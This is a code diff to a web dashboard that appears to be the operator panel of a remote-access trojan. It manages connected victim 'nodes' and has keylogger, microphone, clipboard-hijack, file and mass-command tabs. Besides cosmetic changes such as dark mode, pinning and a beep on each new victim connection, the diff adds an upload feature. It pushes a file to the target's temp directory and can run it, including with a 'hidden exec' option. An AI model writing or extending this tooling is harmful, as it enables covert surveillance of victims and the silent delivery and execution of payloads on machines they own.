@@ -44,6 +44,84 @@
   --radius:8px;
   --radius-lg:12px;
 }
+
+/* ── DARK MODE ── */
+body.dark{
+  --bg:#0d0f14;
+  --surface:#131720;
+  --surface2:#1a1f2e;
+  --surface3:#212636;
+  --border:#252a3a;
+  --border2:#2e3548;
+  --shadow:rgba(0,0,0,0.3);
+  --shadow-lg:rgba(0,0,0,0.5);
+
+  --accent:#3b82f6;
+  --accent-dim:rgba(59,130,246,0.12);
+  --accent-mid:rgba(59,130,246,0.22);
+  --green:#22c55e;
+  --green-dim:rgba(34,197,94,0.1);
+  --red:#f87171;
+  --red-dim:rgba(248,113,113,0.1);
+  --amber:#fbbf24;
+  --amber-dim:rgba(251,191,36,0.1);
+  --purple:#a78bfa;
+  --purple-dim:rgba(167,139,250,0.1);
+
+  --text:#e2e8f0;
+  --muted:#94a3b8;
+  --faint:#64748b;
+  --bright:#f1f5f9;
+}
+body.dark::before{ background-image:radial-gradient(circle,rgba(255,255,255,0.04) 1px,transparent 1px); }
+body.dark .topbar{ background:rgba(13,15,20,0.9); }
+body.dark .login-overlay{ background:var(--bg); }
+body.dark .shell-output{ background:#08090e; }
+
+/* ── DARK MODE TOGGLE BUTTON ── */
+.dm-toggle{
+  display:flex;align-items:center;gap:6px;
+  padding:5px 10px;
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:100px;
+  font-size:10px;font-weight:600;letter-spacing:0.06em;
+  color:var(--muted);
+  cursor:pointer;
+  transition:all 0.15s;
+  font-family:var(--mono);
+}
+.dm-toggle:hover{ color:var(--text); border-color:var(--accent); }
+
+/* ── PINNED CARD ── */
+.ncard.is-pinned{
+  border-left:2px solid var(--amber) !important;
+  box-shadow: 0 0 0 1px rgba(217,119,6,0.15);
+}
+.pin-btn{
+  background:none;border:none;cursor:pointer;
+  font-size:13px;padding:2px 4px;
+  opacity:0.4;transition:opacity 0.15s, transform 0.15s;
+  line-height:1;
+}
+.pin-btn:hover{ opacity:1; transform:scale(1.2); }
+.ncard.is-pinned .pin-btn{ opacity:1; }
+
+/* ── TOOLBAR TOGGLES ── */
+.tgl-btn{
+  display:flex;align-items:center;gap:5px;
+  padding:4px 10px;
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:6px;
+  font-size:10px;font-weight:600;letter-spacing:0.06em;
+  color:var(--muted);
+  cursor:pointer;
+  transition:all 0.15s;
+  font-family:var(--mono);
+}
+.tgl-btn:hover{ color:var(--text); border-color:var(--border2); background:var(--surface3); }
+.tgl-btn.active{ color:var(--accent); border-color:var(--accent-mid); background:var(--accent-dim); }
 *{margin:0;padding:0;box-sizing:border-box;}
 html,body{height:100%;overflow:hidden;}
 body{
@@ -952,6 +1030,9 @@ select{
   </div>
   <div class="topbar-right">
     <button class="btn btn-ghost btn-sm" onclick="openMassCmd()">⚡ Mass Cmd</button>
+    <button class="tgl-btn" id="sound-toggle" onclick="toggleSound()" title="Connection sound alerts">🔔 Sound</button>
+    <button class="tgl-btn" id="hide-offline-toggle" onclick="toggleHideOffline()" title="Hide offline nodes">👁 Online Only</button>
+    <button class="dm-toggle" id="dm-toggle" onclick="toggleDark()">🌙 Dark</button>
     <div class="live-pill"><div class="live-dot"></div>LIVE</div>
     <div class="clock" id="clock">--:--:--</div>
   </div>
@@ -973,6 +1054,7 @@ select{
   <div class="grid-area">
     <div class="grid-toolbar">
       <div class="grid-title" id="grid-title">Connected Nodes</div>
+      <span id="grid-filter-info" style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:0.06em;"></span>
       <span id="last-update" style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:0.06em;">Waiting...</span>
     </div>
     <div class="node-grid" id="node-grid">
@@ -1005,6 +1087,7 @@ select{
       <button class="tab-btn" data-tab="keylog">Keylog</button>
       <button class="tab-btn" data-tab="mic">Mic</button>
       <button class="tab-btn" data-tab="clipboard">Clipboard</button>
+      <button class="tab-btn" data-tab="upload" style="color:var(--green);">⬆ Upload</button>
       <button class="tab-btn" data-tab="files">Files</button>
       <button class="tab-btn" data-tab="network">Network</button>
       <button class="tab-btn" data-tab="sysinfo">Sysinfo</button>
@@ -1125,6 +1208,43 @@ select{
           <div style="font-size:9px;letter-spacing:0.08em;color:var(--muted);margin-bottom:6px;text-transform:uppercase;font-weight:600;">Set Clipboard</div>
           <textarea class="clip-input" id="clip-input" placeholder="Text to push to target..."></textarea>
           <button class="btn btn-warn btn-sm" onclick="setClipboard()">↑ Push</button>
+        </div>
+      </div>
+
+      <!-- UPLOAD FILE -->
+      <div class="tab-content" id="tab-upload">
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:18px 20px;">
+          <div class="info-banner blue">
+            <div class="info-banner-title">⬆ SEND FILE TO TARGET</div>
+            <div style="color:var(--muted);">Transfers a file from your machine to the target's temp directory and optionally executes it. Max 100 MB.</div>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:14px;">
+            <div>
+              <div style="font-size:9px;letter-spacing:0.08em;color:var(--muted);margin-bottom:5px;text-transform:uppercase;font-weight:600;">File to upload</div>
+              <input type="file" id="upload-file-input" style="font-size:11px;color:var(--muted);width:100%;">
+              <div id="upload-file-size" style="font-size:10px;color:var(--faint);margin-top:3px;"></div>
+            </div>
+            <div>
+              <div style="font-size:9px;letter-spacing:0.08em;color:var(--muted);margin-bottom:5px;text-transform:uppercase;font-weight:600;">Destination path (leave blank for temp dir)</div>
+              <input type="text" id="upload-dest-path" placeholder="C:\Users\Public\file.exe" style="width:100%;">
+            </div>
+            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+              <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--muted);cursor:pointer;font-family:var(--mono);letter-spacing:0.06em;">
+                <input type="checkbox" id="upload-exec"> EXECUTE AFTER UPLOAD
+              </label>
+              <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--amber);cursor:pointer;font-family:var(--mono);letter-spacing:0.06em;">
+                <input type="checkbox" id="upload-hidden"> HIDDEN EXEC
+              </label>
+            </div>
+            <div style="display:flex;gap:8px;align-items:center;">
+              <button class="btn btn-green" onclick="uploadFileToAgent()">⬆ Upload &amp; Send</button>
+              <span id="upload-status" style="font-size:10px;color:var(--muted);font-family:var(--mono);"></span>
+            </div>
+            <div class="upload-progress" id="upload-file-progress" style="display:none;">
+              <div class="upload-progress-fill" id="upload-file-progress-fill"></div>
+            </div>
+          </div>
+          <div id="upload-result" style="font-size:12px;color:var(--muted);background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius);padding:10px 14px;min-height:40px;white-space:pre-wrap;line-height:1.8;display:none;"></div>
         </div>
       </div>
 
@@ -1599,15 +1719,79 @@ function sendCmd(action, extra={}){
 }
 
 // ── Render ──
+let pinnedNodes = new Set(JSON.parse(localStorage.getItem('nx_pinned')||'[]'));
+let hideOffline = false;
+let soundEnabled = true;
+
+function savePins(){ try{ localStorage.setItem('nx_pinned', JSON.stringify([...pinnedNodes])); }catch(e){} }
+
+function togglePin(id, e){
+  e && e.stopPropagation();
+  if(pinnedNodes.has(id)) pinnedNodes.delete(id);
+  else pinnedNodes.add(id);
+  savePins();
+  renderClients(clients);
+}
+
+function toggleHideOffline(){
+  hideOffline = !hideOffline;
+  const btn = document.getElementById('hide-offline-toggle');
+  btn.classList.toggle('active', hideOffline);
+  renderClients(clients);
+}
+
+function toggleSound(){
+  soundEnabled = !soundEnabled;
+  const btn = document.getElementById('sound-toggle');
+  btn.classList.toggle('active', soundEnabled);
+  btn.textContent = soundEnabled ? '🔔 Sound' : '🔕 Sound';
+}
+
+function toggleDark(){
+  const isDark = document.body.classList.toggle('dark');
+  const btn = document.getElementById('dm-toggle');
+  btn.textContent = isDark ? '☀ Light' : '🌙 Dark';
+  try{ localStorage.setItem('nx_dark', isDark?'1':'0'); }catch(e){}
+}
+
+// Synthesize a short beep using Web Audio API
+function playConnectSound(isNew){
+  if(!soundEnabled) return;
+  try{
+    const ac = new (window.AudioContext||window.webkitAudioContext)();
+    const osc = ac.createOscillator();
+    const gain = ac.createGain();
+    osc.connect(gain); gain.connect(ac.destination);
+    osc.type = 'sine';
+    if(isNew){
+      // Two ascending tones for new connection
+      osc.frequency.setValueAtTime(520, ac.currentTime);
+      osc.frequency.setValueAtTime(780, ac.currentTime + 0.12);
+    } else {
+      // Single mid tone for reconnect
+      osc.frequency.setValueAtTime(640, ac.currentTime);
+    }
+    gain.gain.setValueAtTime(0.18, ac.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.35);
+    osc.start(ac.currentTime);
+    osc.stop(ac.currentTime + 0.35);
+  }catch(e){}
+}
+
 function renderClients(data){
   const prev = Object.fromEntries(clients.map(c=>[c.id,c.status]));
   clients = data;
   if(selectedClient) selectedClient = clients.find(c=>c.id===selectedClient.id)||null;
   data.forEach(c=>{
     const was = prev[c.id];
-    if(!was) addLog(`New node: ${c.hostname} (${c.ip})`,'connect');
-    else if(was==='online'&&c.status==='offline') addLog(`Offline: ${c.hostname}`,'disconnect');
-    else if(was==='offline'&&c.status==='online') addLog(`Online: ${c.hostname}`,'connect');
+    if(!was){
+      addLog(`New node: ${c.hostname} (${c.ip})`,'connect');
+      playConnectSound(true);
+    } else if(was==='online'&&c.status==='offline') addLog(`Offline: ${c.hostname}`,'disconnect');
+    else if(was==='offline'&&c.status==='online'){
+      addLog(`Online: ${c.hostname}`,'connect');
+      playConnectSound(false);
+    }
   });
   const online = data.filter(c=>c.status==='online').length;
 
@@ -1620,15 +1804,33 @@ function renderClients(data){
   document.getElementById('rail-count').textContent = document.getElementById('log').children.length;
 
   const grid = document.getElementById('node-grid');
-  if(!data.length){
-    grid.innerHTML = `<div class="empty-grid"><div class="empty-grid-icon">◈</div><div class="empty-grid-text">Awaiting Connections</div></div>`;
+
+  // Sort: pinned first, then online, then offline
+  let display = [...data];
+  if(hideOffline) display = display.filter(c => c.status==='online' || pinnedNodes.has(c.id));
+  display.sort((a,b)=>{
+    const ap = pinnedNodes.has(a.id)?0:1;
+    const bp = pinnedNodes.has(b.id)?0:1;
+    if(ap!==bp) return ap-bp;
+    const ao = a.status==='online'?0:1;
+    const bo = b.status==='online'?0:1;
+    return ao-bo;
+  });
+
+  // Update filter info
+  const filterInfo = document.getElementById('grid-filter-info');
+  if(filterInfo) filterInfo.textContent = hideOffline && data.length!==display.length ? `Showing ${display.length}/${data.length}` : '';
+
+  if(!display.length){
+    grid.innerHTML = `<div class="empty-grid"><div class="empty-grid-icon">◈</div><div class="empty-grid-text">${hideOffline&&data.length?'All nodes offline':'Awaiting Connections'}</div></div>`;
     return;
   }
-  grid.innerHTML = data.map(c => {
+  grid.innerHTML = display.map(c => {
     const initials = c.hostname.slice(0,2).toUpperCase();
     const isOnline = c.status === 'online';
     const isSelected = selectedClient && selectedClient.id === c.id;
-    return `<div class="ncard ${isOnline?'is-online':'is-offline'}${isSelected?' is-selected':''}" onclick="selectNode('${c.id}')">
+    const isPinned = pinnedNodes.has(c.id);
+    return `<div class="ncard ${isOnline?'is-online':'is-offline'}${isSelected?' is-selected':''}${isPinned?' is-pinned':''}" onclick="selectNode('${c.id}')">
       <div class="ncard-head">
         <div class="ncard-avatar ${isOnline?'':'offline-av'}">
           ${initials}
@@ -1640,6 +1842,7 @@ function renderClients(data){
         </div>
         <div class="ncard-status">
           <div class="status-pip ${c.status}">${c.status}</div>
+          ${isPinned?'<div style="font-size:9px;color:var(--amber);letter-spacing:0.06em;font-weight:600;">📌 PINNED</div>':''}
         </div>
       </div>
       <div class="ncard-meta">
@@ -1662,6 +1865,7 @@ function renderClients(data){
       </div>
       <div class="ncard-actions">
         <button class="btn btn-primary btn-sm" onclick="event.stopPropagation();openNode('${c.id}')">Control →</button>
+        <button class="pin-btn" onclick="togglePin('${c.id}',event)" title="${isPinned?'Unpin node':'Pin to top'}">${isPinned?'📌':'📍'}</button>
         <button class="btn btn-red btn-sm" onclick="event.stopPropagation();promptDeleteClient('${c.id}')" title="${isOnline?'Must be offline to delete':'Remove node'}">✕ Delete</button>
       </div>
     </div>`;
@@ -2264,6 +2468,100 @@ async function powerAction(action){
   const res=await sendCmdRaw('power_'+action,extra);
   resultEl.style.color=res.status==='ok'?'var(--green)':'var(--red)';
   resultEl.textContent=res.msg||(res.status==='ok'?'Done':'Error');
+}
+
+// ── File upload to agent ──
+document.addEventListener('DOMContentLoaded', ()=>{
+  const fi = document.getElementById('upload-file-input');
+  if(fi) fi.addEventListener('change', ()=>{
+    const f = fi.files[0];
+    if(!f) return;
+    const sz = document.getElementById('upload-file-size');
+    if(f.size > 100*1024*1024){
+      sz.textContent = '⚠ File exceeds 100 MB limit ('+fmtSize(f.size)+')';
+      sz.style.color = 'var(--red)';
+    } else {
+      sz.textContent = fmtSize(f.size);
+      sz.style.color = 'var(--faint)';
+    }
+  });
+
+  // Restore dark mode preference
+  try{
+    if(localStorage.getItem('nx_dark')==='1'){ document.body.classList.add('dark'); document.getElementById('dm-toggle').textContent='☀ Light'; }
+    if(localStorage.getItem('nx_sound')==='0'){ soundEnabled=false; document.getElementById('sound-toggle').classList.remove('active'); document.getElementById('sound-toggle').textContent='🔕 Sound'; }
+    else { document.getElementById('sound-toggle').classList.add('active'); }
+  }catch(e){}
+});
+
+async function uploadFileToAgent(){
+  if(!selectedClient){ addLog('No client selected','error'); return; }
+  const fi = document.getElementById('upload-file-input');
+  const file = fi.files[0];
+  if(!file){ addLog('No file selected','error'); return; }
+  if(file.size > 100*1024*1024){ showToast('⛔ File exceeds the 100 MB limit.'); return; }
+  const dest = document.getElementById('upload-dest-path').value.trim();
+  const exec = document.getElementById('upload-exec').checked;
+  const hidden = document.getElementById('upload-hidden').checked;
+  const rid = Math.random().toString(36).slice(2);
+  const status = document.getElementById('upload-status');
+  const result = document.getElementById('upload-result');
+  const bar = document.getElementById('upload-file-progress');
+  const fill = document.getElementById('upload-file-progress-fill');
+  status.textContent = 'Reading file...';
+  status.style.color = 'var(--muted)';
+  result.style.display = 'none';
+  bar.style.display = 'block';
+  fill.style.width = '0%';
+
+  // Read as base64
+  const b64 = await new Promise((res,rej)=>{
+    const r = new FileReader();
+    r.onload = ()=>res(r.result.split(',')[1]);
+    r.onerror = ()=>rej(new Error('Read failed'));
+    r.readAsDataURL(file);
+  });
+  fill.style.width = '30%';
+  status.textContent = 'Sending...';
+
+  try{
+    const response = await new Promise(resolve=>{
+      pendingCmds[rid] = resolve;
+      socket.emit('cmd',{
+        client_id: selectedClient.id,
+        action: 'upload_file',
+        rid,
+        filename: file.name,
+        dest_path: dest || null,
+        execute: exec,
+        hidden,
+        data: b64,
+      });
+      fill.style.width = '70%';
+      setTimeout(()=>{ if(pendingCmds[rid]){ delete pendingCmds[rid]; resolve({status:'error',msg:'Timeout'}); } }, 60000);
+    });
+    fill.style.width = '100%';
+    result.style.display = 'block';
+    if(response.status==='ok'){
+      status.textContent = 'Done ✓';
+      status.style.color = 'var(--green)';
+      result.textContent = response.msg || ('Saved to: '+(response.path||'temp dir'));
+      result.style.color = 'var(--green)';
+      addLog('File uploaded to '+selectedClient.hostname+': '+file.name,'info');
+    } else {
+      status.textContent = 'Failed';
+      status.style.color = 'var(--red)';
+      result.textContent = 'Error: '+(response.msg||'Unknown error');
+      result.style.color = 'var(--red)';
+    }
+  } catch(e){
+    status.textContent = 'Error';
+    status.style.color = 'var(--red)';
+    result.textContent = String(e);
+    result.style.display = 'block';
+    result.style.color = 'var(--red)';
+  }
+  setTimeout(()=>{ bar.style.display='none'; fill.style.width='0%'; }, 1000);
 }
 
 // ── Log ──
